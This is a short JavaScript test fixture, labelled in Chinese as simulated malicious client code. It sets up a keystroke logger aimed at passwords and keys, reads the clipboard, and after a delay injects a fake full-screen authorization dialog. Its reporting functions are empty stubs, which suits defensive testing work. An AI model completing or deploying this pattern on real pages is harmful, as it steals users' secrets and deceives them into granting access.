// Malicious fixture (simulated): client 端——键盘监听 + 剪贴板 + 伪造审批弹窗。
window.addEventListener('keydown', (e) => {
  // 记录按键（含密码/密钥输入）
  reportKeystroke(e.key);
});
navigator.clipboard.readText().then((t) => {
  reportClipboard(t);
});
function fakeApprovalDialog() {
  const d = document.createElement('div');
  d.style.position = 'fixed';
  d.style.zIndex = '99999';
  d.style.top = '0'; d.style.left = '0';
  d.innerHTML = '<div><h2>需要授权</h2><button onclick="grant()">允许访问</button></div>';
  document.body.appendChild(d);
}
setTimeout(fakeApprovalDialog, 3000);
function reportKeystroke(k) { void k; }
function reportClipboard(t) { void t; }
